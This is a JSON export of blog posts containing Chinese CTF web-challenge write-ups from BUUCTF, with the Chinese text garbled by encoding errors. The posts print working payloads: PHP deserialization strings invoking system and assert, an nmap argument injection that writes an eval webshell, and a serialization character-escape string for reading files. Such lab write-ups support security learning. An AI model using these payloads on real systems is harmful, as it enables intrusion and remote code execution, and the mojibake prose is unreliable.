[{"title":"buuctf22","date":"2021-08-02T12:02:24.000Z","path":"2021/08/02/buuctf22/","text":"","tags":[]},{"title":"buuctf21","date":"2021-08-01T04:16:03.000Z","path":"2021/08/01/buuctf21/","text":"[NPUCTF2020]ReadlezPHPæ‰“å¼€å®¹å™¨ï¼Œå‘ç°é¡µé¢è¿˜â€œæŒºå¹²å‡€çš„â€ ä¸€.åˆæ­¥æ¢ç´¢æŸ¥çœ‹æºç ï¼š å¯ä»¥çœ‹åˆ°ä»–æ˜¯é€šè¿‡å®šå‘ä¸€ä¸ªæ–‡ä»¶æ¥è·å–æ—¶é—´ä¿¡æ¯çš„ è®¿é—®ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼š äºŒ.ä»£ç å®¡è®¡å­˜åœ¨ä¸€ä¸ªç±»HelloPhpï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯$b($a)ï¼Œæ„Ÿè§‰å¯ä»¥æ„é€ $b=systemï¼Œ$a=lsï¼Œæ¥è¾¾åˆ°rce æ„é€ åºåˆ—åŒ– payloadï¼š?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;ls&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125; çœ‹æ¥æ²¡æœ‰recæˆåŠŸï¼Œçœ‹æ¥æ˜¯è¿‡æ»¤äº†ï¼Œçœ‹äº†wpå­¦äº†ä¸€ä¸‹åˆ«çš„å§¿åŠ¿ ä¸‰.é¢„å¤‡çŸ¥è¯†assert()å‡½æ•°ï¼š åˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ã€‚è¿”å›true or falseã€‚ å½“å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè¢«å½“ä½œphpä»£ç æ‰§è¡Œã€‚ è¿™é‡Œè¦æ³¨æ„assertä¸evalçš„åŒºåˆ« assertæŠŠæ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“phpä»£ç æ‰§è¡Œï¼› evalæŠŠåˆæ³•çš„phpä»£ç æ‰§è¡Œã€‚ ä¸¾ä¸¤ä¸ªä¾‹å­ï¼š assert(eval(â€˜echo 1;â€™)); ç›´æ¥ä¼ é€’æ™®é€šä»£ç æ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œå¦‚ï¼šassert(â€˜echo 1;â€™); å››.æ€è·¯æ„å»ºæˆ‘ä»¬æ„é€ ï¼š $a=phpinfo()ï¼›$b=assert payloadï¼š?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; ç„¶åCtrl+fæœç´¢flag å‚è€ƒèµ„æ–™ï¼šhttps://www.cnblogs.com/sn00py/p/5925944.html https://blog.csdn.net/whatday/article/details/59168605?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control https://blog.csdn.net/RABCDXB/article/details/116140760?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf20","date":"2021-07-31T09:52:20.000Z","path":"2021/07/31/buuctf20/","text":"[BJDCTF2020]EasySearchæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å…¥é¡µé¢ ä¸€.åˆæ­¥æ¢ç´¢å°è¯•sqlæ³¨å…¥ï¼Œä½†æ˜¯ä¸ç®¡è¾“å…¥ä»€ä¹ˆéƒ½æ˜¯å›æ˜¾ çœ‹æ¥ä¸æ˜¯è€ƒå¯ŸSQLæ³¨å…¥ï¼Œçœ‹ä¸€ä¸‹æºç ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼Œç”¨dirsearchæ ¹æœ¬è·‘ä¸å‡ºæ¥ï¼Œbuuä¼šä¸€ç›´å´©ã€‚ åªèƒ½æ‰‹å·¥æ¥æµ‹è¯•äº†ï¼Œä¹‹å‰æœ‰å­˜ä¸€ä¸ªå¸¸è§æ–‡ä»¶å¤‡ä»½åç¼€çš„åå• è¿æ°”æ¯”è¾ƒå¥½ï¼Œç¬¬äºŒä¸ªå°±è¯•å‡ºæ¥äº†æºç æ³„éœ²ï¼š äºŒ.ä»£ç å®¡è®¡POSTå‚æ•°$usernameå’Œ$passwordï¼Œifè¯­å¥åˆ¤æ–­$passwordç»è¿‡MD5ç¼–ç åæˆªå–å‰å…­ä½æ˜¯å¦ç­‰äº6d0bc1 ç„¶åä»–ä¼šæ„å»ºä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼Œè·¯å¾„çš„å…¶ä¸­ä¸€éƒ¨åˆ†æ˜¯è°ƒç”¨get_hash()å‡½æ•°éšæœºç”Ÿæˆçš„ ä¸è¿‡ä»–è¿™ä¸ª.shtnlåç¼€çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆæˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§ ä¸‰.é¢„å¤‡çŸ¥è¯† shtmlç®€ä»‹ SSIï¼ˆServer Side Include)ï¼Œé€šå¸¸ç§°ä¸ºæœåŠ¡å™¨ç«¯åµŒå…¥ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºASPçš„åŸºäºæœåŠ¡å™¨çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚å¤§å¤šæ•°ï¼ˆå°¤å…¶æ˜¯åŸºäºUnixå¹³å°ï¼‰çš„WEBæœåŠ¡å™¨å¦‚Netscape Enterprise Serverç­‰å‡æ”¯æŒSSIå‘½ä»¤ã€‚ SSIå·¥ä½œåŸç†ï¼šåœ¨ä¸€ä¸ªé€šå¸¸**ä»¥.shtmlä¸ºæ‰©å±•å**çš„SSIæ–‡ä»¶ä¸­ï¼Œæ ‡å‡†çš„HTMLç¼–ç ä¼šè¢«ç›´æ¥é€åˆ°æµè§ˆå™¨ä¸Šï¼Œè€Œå†…åµŒPerlè¯­è¨€å½¢å¼çš„SSIå‘½ä»¤åˆ™å…ˆè¢«ç½‘ç»œæœåŠ¡å™¨è§£é‡Šæ‰§è¡Œï¼Œå¦‚æœæ˜¯æ ‡å‡†è¾“å‡ºçš„è¯ï¼Œè¾“å‡ºä¿¡æ¯ä¹Ÿå°†ä½œä¸ºæ ‡å‡†çš„HTMLè€Œè¢«é€è‡³æµè§ˆå™¨ã€‚ SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ è¯¦è§ï¼šhttps://cloud.tencent.com/developer/article/1540513 â€‹ https://blog.csdn.net/qq_40657585/article/details/84260844 å››.æ€è·¯æ„å»ºæˆ‘ä»¬å…ˆç™»å…¥manage systemçœ‹çœ‹ã€‚é‚£ä¹ˆé¦–å…ˆè¦æ‰¾åˆ°ç¬¦åˆifè¯­å¥çš„$password æ‹¿åˆ«äººçš„è„šæœ¬è·‘ä¸€ä¸‹ï¼š POSTæ•°æ® å‘ç°å›æ˜¾ç»™æˆ‘ä»¬ä¸€ä¸ªæ–‡ä»¶åï¼Œè¿™ä¸ªå°±æ˜¯æºç é‡Œæ„é€ çš„æ–‡ä»¶åäº† è®¿é—®ä¸€ä¸‹ï¼š é‚£æˆ‘ä»¬ç°åœ¨è¦æƒ³æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªSSIæ³¨å…¥äº†ï¼Œç”±äº$passwordçš„å€¼è¢«å¼ºåˆ¶äº†ï¼Œæ ¹æ®ç½‘é¡µçš„å›æ˜¾æ„Ÿè§‰é‚£æ³¨å…¥ç‚¹å¯èƒ½åœ¨$usernameæˆ–è€…cilent-ip ä½†æ˜¯æˆ‘ä¼ªé€ cilent-ipå‘ç°å›æ˜¾çš„Client IPçš„å€¼éƒ½ä¸ä¼šå˜ï¼ŒåŒ…æ‹¬XFFä¹Ÿæ˜¯ï¼Œé‚£ä¹ˆåªå‰©ä¸‹$usernameæœ€åçš„å¸Œæœ›äº† è®¿é—®å›æ˜¾çš„æ–‡ä»¶ æˆåŠŸå›æ˜¾å½“å‰æ–‡ä»¶å¤¹ç›®å½•ï¼Œä½†æ˜¯flagä¸åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œè®¿é—®ä¸Šä¸€çº§ç›®å½•ï¼š cat flagæ–‡ä»¶","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf19","date":"2021-07-30T04:12:47.000Z","path":"2021/07/30/buuctf19/","text":"[CISCN2019 åä¸œå—èµ›åŒº]Web11æ‰“å¼€å®¹å™¨ï¼Œæµè§ˆç½‘é¡µå‘ç°ä»¥ä¸‹æ³¨æ„ç‚¹ çœ‹åˆ°æ˜¯åŸºäºSmartyæ¨¡æ¿çš„APIï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬ä¼šè”æƒ³åˆ°ä¼šä¸ä¼šå­˜åœ¨SSTIæ³¨å…¥ï¼Œè€Œä¸”æˆ‘ä»¬ä¹‹å‰æœ‰åšè¿‡ç±»ä¼¼çš„ï¼Œæ ¹æ®XFFè·å–æˆ‘ä»¬çš„ipï¼Œå› æ­¤è¯•è¯•æ³¨å…¥ç‚¹ä¼šä¸ä¼šåœ¨æ–‡ä»¶å¤´çš„XFFä¸­ å¯ä»¥çœ‹åˆ°å®ƒæ‰§è¡Œäº†æˆ‘ä»¬çš„è¿ç®—å¼ï¼Œé‚£ä¹ˆè¯´æ˜å­˜åœ¨SSTIæ³¨å…¥ ç›´æ¥cat flag å‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/m0_56059226/article/details/118804585 http://www.mamicode.com/info-detail-2969943.html [MRCTF2020]PYWebsiteæ‰“å¼€å®¹å™¨ï¼Œå‘ç°å«æˆ‘ä»¬è´­ä¹°ä¸œè¥¿ ä¸€.åˆæ­¥æ¢ç´¢æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€æ®µjsä»£ç ï¼š 12345678910111213141516171819202122&lt;script&gt;function enc(code)&#123; hash = hex_md5(code); return hash;&#125;function validate()&#123; var code = document.getElementById(&quot;vcode&quot;).value; if (code != &quot;&quot;)&#123; if(hex_md5(code) == &quot;0cd4da0223c0b280829dc3ea458d655c&quot;)&#123; alert(&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;); window.location = &quot;./flag.php&quot; &#125;else&#123; alert(&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;); &#125; &#125;else&#123; alert(&quot;è¯·è¾“å…¥æˆæƒç &quot;); &#125;&#125; &lt;/script&gt; å½“æˆ‘ä»¬è¾“å…¥çš„codeç»è¿‡hex_md5ç¼–ç åç­‰äº0cd4da0223c0b280829dc3ea458d655cæ—¶ä¼šé‡å®šå‘åˆ°flag.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è®¿é—®flag.php å›æ˜¾å¾—ï¼š è¿™é‡Œæœ‰ä¸¤ä¸ªæš—ç¤ºç‚¹ï¼Œæ„Ÿè§‰åœ¨æš—ç¤ºæˆ‘ä»¬ä¼ªé€ XFFï¼ŒæŠ“åŒ…æ›´æ”¹æ–‡ä»¶å¤´ï¼š","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buutcf18","date":"2021-07-29T14:08:58.000Z","path":"2021/07/29/buutcf18/","text":"[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmapè¿™é¢˜å’Œä¹‹å‰çš„[BUUCTF 2018]Online Toolå¾ˆåƒ è¯•ç”¨ä¹‹å‰çš„payloadï¼š 1&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39; å›æ˜¾ è¯´æ˜å­˜åœ¨é˜²ç«å¢™è¿‡æ»¤ï¼Œfuzzå‘ç°è¿‡æ»¤äº†php è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡=æ›¿æ¢ç¬¬ä¸€ä¸ªphpï¼Œç”¨phtmlæ›¿æ¢ç¬¬äºŒä¸ªphp payloadï¼š 1&#39;&lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.phtml &#39; å›æ˜¾ ä½†æ˜¯æˆ‘ä»¬è¿™è¾¹ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡åŠæ³•ç”¨èšå‰‘ç›´æ¥è¿æ¥ æºç æç¤ºflagåœ¨æ ¹ç›®å½•ä¸‹ å°è¯•POSTå‘½ä»¤","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf17","date":"2021-07-27T10:01:24.000Z","path":"2021/07/27/buuctf17/","text":"[å®‰æ´µæ¯ 2019]easy_serialize_phpæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125; ä¸€.ä»£ç å®¡è®¡ é€šè¿‡GETæ–¹å¼è·å–å˜é‡fï¼Œå°†å…¶èµ‹å€¼ç»™ $functionã€‚ ifè¯­å¥åˆ¤æ–­$functionçš„å€¼ï¼š1.$function == &#39;highlight_file&#39;ï¼Œæ‰§è¡Œhighlight_file(&#39;index.php&#39;)ï¼› â€‹ 2.$function == &#39;phpinfo&#39;ï¼Œæ‰§è¡Œ eval(&#39;phpinfo();&#39;); â€‹ 3.$function == &#39;show_image&#39;ï¼Œæ‰§è¡Œ$userinfo = unserialize($serialize_info);â€‹ echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); extract($_POST)å°†æˆ‘ä»¬POSTçš„æ•°ç»„ä¸­çš„å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚å¯ä»¥å®ç°å˜é‡è¦†ç›–ã€‚ ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼šå½“æˆ‘ä»¬ä¼ å…¥$_SESSION[flag]=123æ—¶ï¼Œ$_SESSION[â€œuserâ€]å’Œ$_SESSION[â€˜functionâ€™] å…¨éƒ¨ä¼šæ¶ˆå¤±ï¼Œåªå‰©ä¸‹$_SESSION[flag]=123ã€‚ $_SESSIONæ˜¯ä¸€ä¸ªå˜é‡æ•°ç»„ï¼Œæœ‰ä¸‰ä¸ªå…ƒç´ ï¼š $_SESSION[â€œuserâ€]; $_SESSION[â€˜functionâ€™]; $_SESSION[â€˜imgâ€™]; â€‹ å…¶ä¸­$_SESSION[â€œuserâ€]ï¼Œ$_SESSION[â€˜functionâ€™]éƒ½æ˜¯å¯ä»¥ç›´æ¥æ§åˆ¶çš„å˜é‡ï¼Œè€Œå½“æˆ‘ä»¬ç»™$_SESSION[â€˜imgâ€™]èµ‹å€¼æ—¶ï¼Œä¼šæ ¼å¤–è°ƒç”¨sha1()åŠ å¯†ä¸€æ¬¡ã€‚ æœåŠ¡å™¨åå°å¯¹$_SESSIONå…ˆåºåˆ—åŒ–ä¸€æ¬¡ï¼ŒåŒæ—¶è¿‡æ»¤&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;å­—ç¬¦ä¸²ï¼Œç„¶åèµ‹å€¼ç»™$serialize_infoï¼›é€šè¿‡ååºåˆ—åŒ–$serialize_infoè·å–$userinfoçš„å€¼ã€‚ äºŒ.çŸ¥è¯†ç‚¹ æ•°ç»„çš„åºåˆ—åŒ– ä¸¾ä¸ªä¾‹å­æ¥ç†è§£ï¼š 1234567891011121314151617&lt;?php$img[&#x27;one&#x27;] = &quot;flag&quot;;$img[&#x27;two&#x27;] = &quot;test&quot;;$a = serialize($img);var_dump($a);#è¾“å‡º: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;$b = unserialize($a);var_dump($b);/*è¾“å‡ºå¦‚ä¸‹å†…å®¹:array(2) &#123; [&quot;one&quot;]=&gt; string(4) &quot;flag&quot; [&quot;two&quot;]=&gt; string(4) &quot;test&quot;&#125;*/ 2.phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ ä¸€ä¸ªæ­£å¸¸çš„ååºåˆ—åŒ–ï¼š 1234&lt;?php$str=&#x27;a:2:&#123;i:0;s:6:&quot;linbei&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;;var_dump(unserialize($str));&gt; ç»“æœï¼š 1234array(2) &#123; [0]&#x3D;&gt; string(6) &quot;linbei&quot; [1]&#x3D;&gt; string(5) &quot;aaaaa&quot; &#125; phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼š 1234&lt;?php$str=&#x27;a:2:&#123;i:0;s:6:&quot;linbei&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;s:5:&quot;12345&quot;;&#125;&#x27;;var_dump(unserialize($str));&gt; è¿™æ ·çš„ç»“æœä¹Ÿè¿˜æ˜¯ï¼š 1234array(2) &#123; [0]&#x3D;&gt; string(6) &quot;linbei&quot; [1]&#x3D;&gt; string(5) &quot;aaaaa&quot; &#125; åŸå› æ˜¯åœ¨phpä¸­ï¼Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ–ã€‚ ä¸‰.æ€è·¯æ„å»ºæˆ‘ä»¬çœ‹åˆ°ä»£ç æ®µæœ‰ä¸€ä¸ªhintï¼Œè¯•ç€æ„å»ºf=phpinfo phpinfoä¸­ä¼šæ˜¾ç¤ºå¾ˆå¤šé…ç½®é¡¹ï¼Œæˆ‘ä»¬çœ‹åˆ°auto_append_file=d0g3_f1ag.phpï¼Œä¼šåœ¨é¡µé¢åº•éƒ¨åŠ è½½d0g3_f1ag.phpæ–‡ä»¶ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½flagåœ¨è¿™é‡Œé¢ã€‚å¯¹d0g3_f1ag.php base64ç¼–ç  æˆ‘ä»¬åœ¨æºç ä¸­çœ‹åˆ°å½“GETçš„f=show_imageæ—¶ä¼šè°ƒç”¨file_get_contentså‡½æ•°ï¼Œä½†æ˜¯ä»–çš„å‚æ•°æ—¶base64ç¼–ç çš„imgï¼Œæˆ‘ä»¬å·²çŸ¥imgæ˜¯ä¸å¯æ§çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå¯ä»¥åˆ©ç”¨ä»–åºåˆ—åŒ–ååˆååºåˆ—åŒ–è¿‡ç¨‹çš„ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚ æˆ‘ä»¬POSTä¸‹é¢å­—ç¬¦ä¸²ï¼š 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; //è¿™é‡Œæˆ‘ä»¬æ²¡æœ‰å¯¹$_SESSION[&#x27;img&#x27;]èµ‹å€¼ï¼Œå› æ­¤ä¼šè¢«é»˜è®¤èµ‹å€¼base64_encode(&#x27;guest_img.png&#x27;) ä¼ å…¥åå°åï¼Œ$_SESSIONå˜é‡æ•°ç»„æœ‰ä¸‰ä¸ªå…ƒç´ ï¼š 123$_SESSION[&quot;user&quot;]=&#x27;flagflagflagflagflagflag&#x27;ï¼›$_SESSION[&quot;function&quot;]=&#x27;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;;$_SESSION[&quot;img&quot;]=base64_encode(&#x27;guest_img.png&#x27;); åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼š 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125; filterè¿‡æ»¤åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125; è¿™æ ·çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ååºåˆ—åŒ–åå¾— 123$_SESSION[&quot;user&quot;]=&#x27;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#x27;ï¼›$_SESSION[&quot;function&quot;]=1234567;$_SESSION[&quot;img&quot;]=ZDBnM19mMWFnLnBocA==; è¿™æ ·æˆ‘ä»¬åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸å°±è¾¾åˆ°äº†æˆ‘ä»¬ç»™imgèµ‹å€¼çš„ç›®çš„ é¡µé¢æ²¡æœ‰å›æ˜¾ï¼ŒæŸ¥çœ‹æºç ï¼š base64ç¼–ç /d0g3_fllllllag åˆšå¥½è¿™ä¸²å­—ç¬¦ä¸²é•¿åº¦ä¹Ÿæ˜¯20ï¼Œç›´æ¥å¸¦å…¥åˆ°æˆ‘ä»¬ä¸Šé¢çš„payloadï¼š 1_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125; å‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/qq_43622442/article/details/106003691 https://www.jianshu.com/p/8e8117f9fd0e https://www.cnblogs.com/h3zh1/p/12732336.html","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf16","date":"2021-07-26T02:29:20.000Z","path":"2021/07/26/buuctf16/","text":"æ‰“å¼€å®¹å™¨ï¼Œæ²¡ä»€ä¹ˆä¿¡æ¯ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡ä»€ä¹ˆä¿¡æ¯ ä¸€.åˆæ­¥æ¢ç´¢çœ‹çœ‹robots.txtæœ‰æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼š è¿”å›äº†ä¸€ä¸ªå‡çš„flagï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°å›æ–‡ä¸­æœ‰ä¸€ä¸ªLook_at_me: /fl4g.phpï¼› è®¿é—®è¿™ä¸ªfl4g.phpæ–‡ä»¶ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;img src=&quot;/img.jpg&quot;&gt;&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;é´æˆœç¬‰ç¼å¿”å‰°é—‚å¯¸æ¹…æµœå—™æ¹…é´æˆ æ®‘é”å†²å§æ¾¹ï¿½, æ¶“å¶†æ§¸é¯å´‡æ¹…éƒå •æ£¿, é™î…æ§¸é¯å……ç¬‰ç¼å¿”å‰°é—‚ï¿½, ç’â•€ç¶˜é­ãƒ©äº¾é´æˆ£ç¹ƒå¯°æ¥ç˜®æµ£çŠ²ã‚½.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;é–²æˆ¦æŒ¶ç‘™ï½…å–…æ¶“å¶„ç°¡ç»Œèœ‚æ±‰é¨å‹¬æ¹°ç’ã„©æ£¶æ£°ï¿½&quot;); &#125;&#125;else&#123; die(&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;é¯å†²åŸŒæ©æ¬é‡œCTFeré·å®åŸŒflagéšï¿½, é°ç†¸ç¸ºå¨‘æ›¢æµ‚, ç’ºæˆå¹“æ¶“æ»„ç·¶å®€ï¿½, éµå¥ç«´ç€¹å •î˜µé˜ï¿½, é¶å©‚å¸¹ç”¯å £æ¡¨é‘å“„å¹“, é‘·î„ç¹éæè¢±æ¶“î…å¬éµå¬ªçš¬é‘¿ï¿½, éŠæç«´é‰îˆ›æšç‘å‘¯æ«§é–°ï¿½, é‘·æ‘ç˜œéˆå¤äº¾, é’î‚¢î„Ÿçå¿”æ¯š.&lt;/br&gt;&quot;; else die(&quot;é´æˆ£åˆ€ç»±Ñƒæˆé‰ãƒ¦åœé¨å‹¯å­é‘²å¤‹æ¹…é™ï¿½, æµ æ ¨å¢¦æµœå—•é‡œé¢ä½ƒç˜½, é¶å©ç²¬æ¶“â‚¬ç€¹è·ºç•¨éºæ‘åŸŒæµœå—›æ½ªå¨²ï¿½&quot;);&#125;else&#123; die(&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;é¯å†²åŸŒæ©æ¬“å™·, é´æˆå–ç€¹ç‚¶â‚¬å±¾î‚¾é±ï¿½, éˆå¤æŒ¶æµœè™¹æ®‘è¹‡î‚¡ç®°å¯°â‚¬å¯°â‚¬çè¾¨æ§¸æ©æ¬ç®é¨å‹¬æ¹¸ç€¹ç‚´æ£¤é—ï¿½, æ¶“æ—€çŸé•ï¿½.&lt;/br&gt;&quot;; system($get_flag);.. &#125;else&#123; die(&quot;è¹‡î‚¢åŸŒé—ˆç‚´åºŠæµœï¿½&quot;); &#125;&#125;else&#123; die(&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;);&#125;?&gt; äºŒ.ä»£ç å®¡è®¡æˆ‘ä»¬è¦ç»•è¿‡ä¸‰ä¸ªifè¯­å¥ï¼š GETå˜é‡$numï¼Œintvalåˆ¤æ–­$numæ˜¯å¦å°äº2020ï¼Œ$num+1æ˜¯å¦å¤§äº2021ï¼› GETå˜é‡$md5ï¼Œifåˆ¤æ–­$md5 MD5ç¼–ç åæ˜¯å¦å¼±ç­‰äºå…¶æœ¬èº«ï¼› GETå˜é‡$get_flagï¼Œå…ˆåˆ¤æ–­$get_flagä¸­æ˜¯å¦å­˜åœ¨ç©ºæ ¼ï¼Œä¸å­˜åœ¨åˆ™æ‰§è¡Œsystem($get_flag)ï¼ŒåŒæ—¶è¿‡æ»¤äº†catå‘½ä»¤ã€‚ ä¸‰.æ€è·¯æ„å»ºé‚£ä¹ˆæˆ‘ä»¬ä¸€å±‚å±‚ç»•è¿‡ï¼š 